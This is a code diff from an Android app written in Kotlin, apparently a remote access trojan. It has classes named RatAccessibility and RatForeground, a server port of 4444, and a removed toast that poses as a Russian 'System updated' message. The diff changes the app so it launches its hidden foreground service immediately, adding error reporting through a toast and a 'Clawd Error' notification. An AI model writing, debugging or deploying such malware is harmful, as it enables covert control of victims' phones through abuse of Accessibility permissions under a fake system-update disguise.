@@ -31,8 +31,24 @@ val SERVER_PORT = 4444
 class MainActivity : android.app.Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        Toast.makeText(this, "Система обновлена.", Toast.LENGTH_LONG).show()
-        // Служба запустится сама, когда пользователь включит Accessibility
+        try {
+            // Пытаемся запустить службу
+            startForegroundService(Intent(this, RatForeground::class.java))
+            Toast.makeText(this, "Служба запущена", Toast.LENGTH_SHORT).show()
+        } catch (e: Exception) {
+            // Если вылетает — показываем ошибку на экране
+            val errorMsg = "Ошибка: ${e.message}"
+            Toast.makeText(this, errorMsg, Toast.LENGTH_LONG).show()
+            
+            // И пишем в уведомление, чтобы точно увидеть
+            val notif = NotificationCompat.Builder(this, "err")
+                .setContentTitle("Clawd Error")
+                .setContentText(errorMsg)
+                .setSmallIcon(android.R.drawable.ic_dialog_alert)
+                .build()
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            nm.notify(1, notif)
+        }
         finish()
     }
 }
@@ -103,8 +119,6 @@ class RatAccessibility : AccessibilityService() {
             notificationTimeout = 100
         }
         serviceInfo = info
-        
-        // Запускаем фоновую службу, когда пользователь дал разрешение
         startForegroundService(Intent(this, RatForeground::class.java))
     }
 
